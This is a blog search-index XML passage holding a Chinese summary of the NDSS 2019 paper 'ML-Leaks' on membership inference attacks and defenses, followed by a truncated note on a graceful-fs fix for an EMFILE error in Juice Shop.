<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ML-Leaks</title>
    <link href="/2021/05/22/ML-Leaks/"/>
    <url>/2021/05/22/ML-Leaks/</url>
    
    <content type="html"><![CDATA[<h1 id="ndss-2019-研究成果概括-ml-leaks"><a class="markdownIt-Anchor" href="#ndss-2019-研究成果概括-ml-leaks"></a> NDSS 2019 研究成果概括 ML-Leaks</h1><h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>本文将对 NDSS (Network and Distributed System Security Symposium) 2019 获奖论文 <em>ML-Leaks: Model and Data Independent Membership Inference Attacks and Defenses on Machine Learning Models</em> 进行解读。这篇论文的主要研究内容是针对机器学习模型的<strong>成员推理攻击</strong>（membership inference attack）以及对应的防御机制，其价值在于证明了经过改进后的成员推理攻击具有较低的成本和较强的可行性，从而构成更现实的威胁。</p><p>论文地址：<a href="https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_03A-1_Salem_paper.pdf">https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_03A-1_Salem_paper.pdf</a></p><p>源码地址：<a href="https://github.com/AhmedSalem2/ML-Leaks">https://github.com/AhmedSalem2/ML-Leaks</a></p><p>论文作者：<a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Salem%2C+A">Ahmed Salem</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Zhang%2C+Y">Yang Zhang</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Humbert%2C+M">Mathias Humbert</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Berrang%2C+P">Pascal Berrang</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Fritz%2C+M">Mario Fritz</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Backes%2C+M">Michael Backes</a></p><h2 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h2><h3 id="研究背景"><a class="markdownIt-Anchor" href="#研究背景"></a> 研究背景</h3><p>机器学习已经成为许多现实应用的核心，互联网巨头如 Google 和 Amazon 已经在推广<strong>机器学习即服务</strong>（MLaaS）的模式，用户可以上传自己的数据集，服务器返回给用户一个训练好的机器学习模型，通常是一个黑盒 API。尽管机器学习模型已得到广泛应用，但它在安全和隐私上却易受攻击，如模型逆向（model inversion）、对抗样本（adversarial examples）和模型提取（model extraction）。</p><p>本文关注的是成员推理攻击（membership inference attack），攻击者的意图是得知某个数据是否被用于训练机器学习模型，这种攻击可能引发严重的后果，比如一个机器学习模型在来自特定疾病患者的数据上训练，攻击者通过得知受害者的数据属于模型的训练集就能立刻推知其健康状况。</p><p>早在2017年，Shokri 等人第一次展示了针对机器学习模型的成员推理攻击，大致思路是使用多个攻击模型（attack models）来对目标模型（target model）的输出，即后验概率（posterior probabilities），进行成员推理。考虑到目标模型是一个黑盒 API，Shokri 等人构造了多个影子模型以模拟目标模型的行为并导出训练攻击模型所需的数据，即后验和真实（ground truth）的成员情况。</p><p>Shokri 等人的工作基于两个主要假设。首先，攻击者需要建立多个影子模型模型，每个模型与目标模型具有相同的结构，这可以通过使用与训练目标模型相同的 MLaaS 实现。第二，用于训练影子模型的数据集来自与目标模型的训练数据相同的分布，这一假设适用于对大部分攻击的评估。Shokir 等人也进一步提出了合成数据来放宽这一假设，但由于效率原因这种方法只能适用于包含二值特征的数据集。</p><p>这两个较强的假设减少了对机器学习模型进行成员推理攻击的攻击面，本文将逐步放宽这些假设，以表明更广泛适用的攻击场景是可能的，同时也提出了两种防御机制。</p><h3 id="准备工作"><a class="markdownIt-Anchor" href="#准备工作"></a> 准备工作</h3><p>本文主要关注分类问题，机器学习中的分类器就是一个函数，其将一个数据点（多维特征向量）映射成一个输出向量<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="script">M</mi><mo stretchy="false">(</mo><mi mathvariant="script">X</mi><mo stretchy="false">)</mo><mo>=</mo><mi mathvariant="script">Y</mi></mrow><annotation encoding="application/x-tex">\mathcal{M(X)=Y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathcal">M</span><span class="mopen">(</span><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathcal" style="margin-right:0.08222em;">Y</span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="script">Y</mi></mrow><annotation encoding="application/x-tex">\mathcal{Y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78055em;vertical-align:-0.09722em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">Y</span></span></span></span></span> 的长度等于类别的个数，大多数情况下 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="script">Y</mi></mrow><annotation encoding="application/x-tex">\mathcal{Y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78055em;vertical-align:-0.09722em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">Y</span></span></span></span></span> 可被解释成在所有类别上后验概率的集合， <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="script">Y</mi></mrow><annotation encoding="application/x-tex">\mathcal{Y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78055em;vertical-align:-0.09722em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">Y</span></span></span></span></span> 中所有值的和为1。</p><p>而成员推理攻击的<strong>攻击模型</strong>可表示成如下函数 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="script">A</mi><mo>:</mo><msub><mi>X</mi><mrow><mi>T</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub><mo separator="true">,</mo><mrow><mi mathvariant="script">M</mi><mo separator="true">,</mo><mi mathvariant="script">K</mi></mrow><mo>→</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\mathcal{A}:X_{Target},\mathcal{M,K}\rightarrow\{0,1\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathcal">A</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328331em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">g</span><span class="mord mathdefault mtight">e</span><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathcal">M</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathcal" style="margin-right:0.01445em;">K</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">}</span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>X</mi><mrow><mi>T</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">X_{Target}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328331em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">g</span><span class="mord mathdefault mtight">e</span><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span> 为目标数据点，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="script">M</mi></mrow><annotation encoding="application/x-tex">\mathcal{M}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathcal">M</span></span></span></span></span> 为训练后的模型（称为目标模型），<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="script">K</mi></mrow><annotation encoding="application/x-tex">\mathcal{K}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.01445em;">K</span></span></span></span></span> 为攻击者的外部知识，结果为0表示目标数据点不是目标模型训练集 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="script">D</mi><mrow><mi>T</mi><mi>r</mi><mi>a</mi><mi>i</mi><mi>n</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\mathcal{D}_{Train}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight">i</span><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的成员，为1则反之。</p><p>本文利用8个不同的数据集进行实验，其中6个与 Shokri 等人使用的数据相同，即MNIST、CIFAR-10、CIFAR-100、Location、Purchase、Adult。按照相同的程序对所有这些数据集进行预处理。此外，本文还利用了另外两个数据集，即 News 和 Face，来进行评估。</p><h3 id="三轮攻击"><a class="markdownIt-Anchor" href="#三轮攻击"></a> 三轮攻击</h3><p><img src="img/ML-Leaks.assets/Table1.png" alt="Table1" /></p><p>从表格中可看出，每一轮攻击都减少了一两个假设，攻击者对目标模型和数据的了解可以越来越少，不禁让人联想起电影《倚天屠龙记》中张三丰教张无忌太极拳，招式忘得愈多，反而学得愈深，颇有老子“绝圣弃智”，“不出于户，以观天下”的味道。</p><h4 id="攻击一不知模型"><a class="markdownIt-Anchor" href="#攻击一不知模型"></a> 攻击一：不知模型</h4><p>本轮攻击主要放宽了影子模型设计上的假设，只需使用1个影子模型而且无需知晓目标模型的结构，就可实施高效且廉价的成员推理攻击。不过，训练影子模型时仍需假设影子数据集 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="script">D</mi><mrow><mi>S</mi><mi>h</mi><mi>a</mi><mi>d</mi><mi>o</mi><mi>w</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\mathcal{D}_{Shadow}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">S</span><span class="mord mathdefault mtight">h</span><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">o</span><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和目标模型的训练数据来自相同的分布。</p><h5 id="单一影子模型"><a class="markdownIt-Anchor" href="#单一影子模型"></a> 单一影子模型</h5><p>这里进一步假设影子模型运用算法和超参数和目标模型相同，在实践中做到这点，攻击者可以使用和目标模型相同的 MLaaS 平台，后面将展示这个假设也可被放宽。</p><p>攻击策略有以下三个阶段：</p><ol><li>影子模型训练：攻击者首先将的影子数据集 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="script">D</mi><mrow><mi>S</mi><mi>h</mi><mi>a</mi><mi>d</mi><mi>o</mi><mi>w</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\mathcal{D}_{Shadow}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">S</span><span class="mord mathdefault mtight">h</span><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">o</span><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 分成两份，用训练集训练影子模型。</li><li>攻击模型训练：攻击者用训练过的影子模型对所有影子数据进行预测，获得后验概率向量，每个数据点取最大的三个值（若为二元分类则取两个）。一个特征向量被标记为1或0分别代表对应的数据点在或不在测试集中，产生的特征向量和标记接着就被用于训练攻击模型。</li><li>成员推理：为了推知目标是否在实际训练集中，攻击者向模型查询该数据点并得到后验概率，同样取最大的三个值，然后传给攻击模型来获得成员预测结果。</li></ol><p>相比 Shokri 的方法需要使用多个影子模型对每个类别分别进行攻击，本方法只需使用一个影子模型进行攻击，这大大减少了攻击的开销。</p><p><img src="img/ML-Leaks.assets/Fig1.png" alt="Fig1" /></p><p>结果如 Fig. 1 所示，本攻击方法的精确率和召回率与 Shokri 等人的几乎一致，在部分数据集上甚至表现更优。</p><h5 id="目标模型结构"><a class="markdownIt-Anchor" href="#目标模型结构"></a> 目标模型结构</h5><p>接下来展示如何放宽攻击者必须知道目标模型的算法与超参数的情况这一假设。</p><p>首先来看<strong>超参数</strong>，暂且假设攻击者知道目标模型是一个神经网络但不了解具体细节，先用目标模型的一半参数（即将批尺寸、隐含单元和正则化参数减半）来训练影子模型时，就 Purchase-100 数据集而言，达到了0.86的精确率和0.83的召回率，这和 Fig. 1 中的结果几乎一致；反之，若用两倍参数来训练影子模型时，表现稍显逊色，但仍达到了0.82的精确率和0.80的召回率。在其他数据集上也得到了类似的结果，这证明了成员推理攻击的灵活性：无需知道模型的超参数也能有良好的性能。</p><p>接着再假设攻击者不知道目标模型使用了何种分类算法，首先尝试在影子模型和目标模型的类别不同的情况下直接实施攻击，结果不尽人意。改进的方法是采用<strong>组合攻击</strong>（combined attack），即将一系列不同的分类器模型组合成一个影子模型，其中每个模型被称为<strong>次影子模型</strong>（sub-shadow model），具体方法如 Fig. 6 所示</p><p><img src="ML-Leaks.assets/Fig6.png" alt="Fig6" /></p><p>在 Purchase-100 数据集上的结果证明，和上一部分所展示的攻击方法相比，在目标模型采用多层感知器和逻辑回归时，组合攻击的表现毫不逊色，而当目标模型采用随机森林时，组合攻击的性能就有所下降。</p><p><img src="img/ML-Leaks.assets/Table2.png" alt="Table2" /></p><h4 id="攻击二不知数据"><a class="markdownIt-Anchor" href="#攻击二不知数据"></a> 攻击二：不知数据</h4><p>本轮攻击放宽了对数据来源的假设，攻击者不再拥有与目标模型的训练数据同分布的数据集，在此情形下，Shokri 等人提议多次查询目标模型以合成数据来训练影子模型，但这种方法只适用于包含二值特征的数据集，而且每合成一个数据点就需要向目标模型发起156次查询，这不仅代价高昂，还可能触发 MLaaS 的警戒机制。与之相比，本方法就能用于攻击在任何数据上训练的机器学习模型，且没有上述任何限制。</p><p>本攻击的策略接近于第一轮攻击，区别在于影子模型所使用的数据集不再与目标模型的训练数据同分布，此种攻击可被称为<strong>数据转移攻击</strong>（data transferring attack）。在此影子模型并非用于模仿目标模型的行为，而只用于概括机器模型训练集中数据点的成员状态。由于只有最大的三个（对二值数据集来说是两个）后验概率会被用于攻击模型，我们可以忽略数据集的类别数不同带来的影响。</p><p><img src="img/ML-Leaks.assets/Fig7.png" alt="Fig7" /></p><p>结果如 Fig. 7 所示，和对角线上第一轮攻击的结果相比，本轮攻击在许多场景下都有接近的表现，如使用 Face 数据集攻击 CIFAR-100 数据集，无论是精确率还是召回率，结果都是0.95，和第一轮攻击相同。在一些场景下，本轮攻击的结果甚至优于第一轮攻击。更有意思的是，在很多场景下，不同来源的数据集能够有效地相互攻击，如 News 数据集 和 CIFAR-100 数据集。</p><h4 id="攻击三我好像在哪见过你"><a class="markdownIt-Anchor" href="#攻击三我好像在哪见过你"></a> 攻击三：我好像在哪见过你</h4><p>本轮攻击不再需要训练任何影子模型，也无需知晓目标模型及其数据分布，攻击者拥有的只是向目标模型查询目标数据点 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>X</mi><mrow><mi>T</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">X_{Target}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328331em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">g</span><span class="mord mathdefault mtight">e</span><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span> 得到的后验概率 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="script">M</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mrow><mi>T</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{M}(X_{Target})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathcal">M</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328331em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">g</span><span class="mord mathdefault mtight">e</span><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 。尽管 Yeom 等人提出过类似的攻击，但他们的方法需要知晓目标数据点的分类标签，这有时是难以获得的，而本方法的适用场景就更广泛。</p><p>本攻击模型的实现是一个无监督二元分类器，攻击者先获得 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="script">M</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mrow><mi>T</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{M}(X_{Target})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathcal">M</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328331em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">g</span><span class="mord mathdefault mtight">e</span><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> ，再拿最高的后验概率和一个确定的阀值相比，若高于阀值，则预测此数据点在目标模型的训练集中。选取最高值作为特征是基于如下推理：模型对训练过的数据点表现得更自信，体现在结果上就是，成员数据点的后验概率最大值高于非成员数据点。这是一种朴素的信念，但也符合我们的直觉，人对熟悉的事物表现得更自信，模型亦是如此。</p><p>阀值的选取可根据需求而定，若更关注精确率则用高阀值，更关注召回率则选择低阀值。本文也提供了选择阀值的通用方法。</p><p><img src="img/ML-Leaks.assets/Fig12.png" alt="Fig12" /></p><p>综合三轮攻击的结果，可以证明成员推理攻击是非常广泛地适用的。</p><h3 id="防御机制"><a class="markdownIt-Anchor" href="#防御机制"></a> 防御机制</h3><h4 id="丢弃"><a class="markdownIt-Anchor" href="#丢弃"></a> 丢弃</h4><p>完全连通的神经网络包含大量的参数，容易发生过拟合，而丢弃（dropout）是减少过拟合的一种非常有效的方法。在一个完全连通的神经网络模型中，通过在每次训练迭代中随机删除一个固定的边缘比例（丢失率）来执行该算法。本文对目标模型的输入层和隐藏层都应用了丢弃法，默认的丢弃率设为0.5，因为实验结果表明过高或过低的丢弃率都会降低模型性能</p><h4 id="模型堆叠"><a class="markdownIt-Anchor" href="#模型堆叠"></a> 模型堆叠</h4><p>丢弃只适用于神经网络模型，而模型堆叠（model stacking）与所选择的分类器无关，这种机制的背后的原理在于，若目标模型的不同部分使用不同的数据子集进行训练，则完整的模型就不易过拟合，这可以通过集成学习（ensemble learning）实现。</p><h3 id="成果总结"><a class="markdownIt-Anchor" href="#成果总结"></a> 成果总结</h3><p>为了证明成员推理攻击的广泛性，本文提出了三轮攻击，逐渐放宽了假设。</p><p>第一轮攻击只用到了一个影子模型，大大降低了攻击成本，还通过组合攻击使得攻击者无需了解目标模型的种类。</p><p>第二轮攻击只用放宽了对数据来源的要求，<strong>数据转移攻击</strong>在实现成员推理攻击效果的同时也更具有普适性。</p><p>第三轮攻击具有最少的假设，攻击者无需构建任何影子模型，攻击是通过无监督的方式进行，在这样的场景下，成员推理仍然卓有成效。</p><p>本文对攻击效果的综合评估充分证明了各种机器学习模型中数据成员的隐私所面临的威胁，为了遏制攻击，本文提出了两种防御机制：<strong>丢弃</strong>和<strong>模型堆叠</strong>。由于模型的过拟合程度和对成员推理的敏感性之间存在联系，这些机制也正是为减少过拟合而生。大量评估证明这些防御机制在抵抗成员推理攻击的同时也维持了模型的高可用性。</p><h2 id="参考文献"><a class="markdownIt-Anchor" href="#参考文献"></a> 参考文献</h2><p>[1] Salem, Ahmed et al. “ML-Leaks: Model and Data Independent Membership Inference Attacks and Defenses on Machine Learning Models.” Proceedings 2019 Network and Distributed System Security Symposium (2019).</p><p>[2] Shokri, R. et al. “Membership Inference Attacks Against Machine Learning Models.” <em>2017 IEEE Symposium on Security and Privacy (SP)</em> (2017).</p><p>[3] Pyrgelis, Apostolos et al. “Knock Knock, Who’s There? Membership Inference on Aggregate Location Data.” <em>ArXiv</em> abs/1708.06145 (2018).</p><p>[4] Jia, J. and N. Gong. “AttriGuard: A Practical Defense Against Attribute Inference Attacks via Adversarial Machine Learning.” <em>USENIX Security Symposium</em> (2018).</p><p>[5] Yeom, Samuel et al. “Privacy Risk in Machine Learning: Analyzing the Connection to Overfitting.” <em>2018 IEEE 31st Computer Security Foundations Symposium (CSF)</em> (2018): 268-282.</p>]]></content>
    
    
    <categories>
      
      <category>记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Node-FileSniffer</title>
    <link href="/2021/04/12/Node-FileSniffer/"/>
    <url>/2021/04/12/Node-FileSniffer/</url>
    
    <content type="html"><![CDATA[<p><code>Error: EMFILE: too many open files</code> <a href="https://github.com/bkimminich/juice-shop/issues/1619">(#1619)</a></p><p>Solution: replace <code>fs</code> with <a href="https://www.npmjs.com/package/graceful-fs"><code>graceful-fs</code></a>, write custom <code>fileSniff</code></p><div class="code-wrapper"><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">'graceful-fs'</span><span class="token punctuation">)</span>fs<span class="token punctuation">.</span><span class="token function">gracefulify</span><span class="token punctuation">(</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>               <span class="token keyword">const</span> <span class="token function-variable function">fileSniff</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>paths<span class="token punctuation">,</span> match<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> matches <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> currPath <span class="token keyword">of</span> paths<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">lstatSync</span><span class="token punctuation">(</span>currPath<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isDirectory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> files <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readdirSync</span><span class="token punctuation">(</span>currPath<span class="token punctuation">)</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> file <span class="token keyword">of</span> files<span class="token punctuation">)</span> paths<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>currPath<span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> data <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>currPath<span class="token punctuation">)</span>      <span class="token keyword">const</span> code <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">const</span> lines <span class="token operator">=</span> code<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> line <span class="token keyword">of</span> lines<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>match<span class="token punctuation">.</span><span class="token function">test</span><span class="token 